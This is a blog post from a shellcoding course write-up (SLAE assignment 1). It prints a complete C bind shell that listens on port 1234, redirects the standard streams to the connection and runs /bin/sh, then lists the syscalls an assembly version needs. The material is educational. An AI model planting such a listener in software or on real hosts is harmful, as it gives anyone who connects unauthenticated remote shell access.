---
layout: single
title: SLAE Assignment 1 -- TCP Bind Shell
date: 2019-5-4
classes: wide
header:
  teaser: /assets/images/OSCP/pwk.png
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
--- 
![](/assets/images/OSCP/OSCP.png)

## Prototype

The first SLAE assignment is to develop shellcode for a bind TCP shell. What is a bind TCP shell? According to [Infosec Institute](https://resources.infosecinstitute.com/icmp-reverse-shell/#gref), a bind shell is "a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machine’s listener which then leads to code or command execution on the server."

The first thing we want to do, in order to see the syscalls required to support the creation of a bind shell, is find the simplest implementation of a bind shell in a language higher than assembly. After a bit of googling, the simplest version of a bind shell in C that I could find is the following, with my comments added:

```c
#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 1234

int main(void) {

    // This is our first syscall, the socket() call. 
    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

    // It looks like here we're building a 'struct' which consists of AF_INET, the interface we want to listen on (all), and a port number to bind on. This entire entity will be referenced in arguments for the next syscall: bind()    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;           // IPv4
    server_addr.sin_addr.s_addr = INADDR_ANY;   // All interfaces (0.0.0.0)
    server_addr.sin_port = htons(PORT);         // Port #

    // Our second syscall, and perhaps the most complicated: bind() 
    bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    // Our third syscall is listen()
    listen(listen_sock, 0);

    // Our fourth syscall is accept() 
    int conn_sock = accept(listen_sock, NULL, NULL);

    // Our fifth syscall, dup2(), is used 3 times
    dup2(conn_sock, 0);
    dup2(conn_sock, 1);
    dup2(conn_sock, 2);

    // Our final syscall is execve(), which runs a program fed to it as a string
    execve("/bin/sh", NULL, NULL);
}
```
Now that that's settled, it's become apparent we need to execute 6 syscalls in our assembly code:
+ socket()
+ bind()
+ listen()
+ accept()
+ dup2()
+ execve()


## Resources
+ [Technical Tips from @m0nk3h](https://h4ck.co/oscp-journey-exam-lab-prep-tips/)



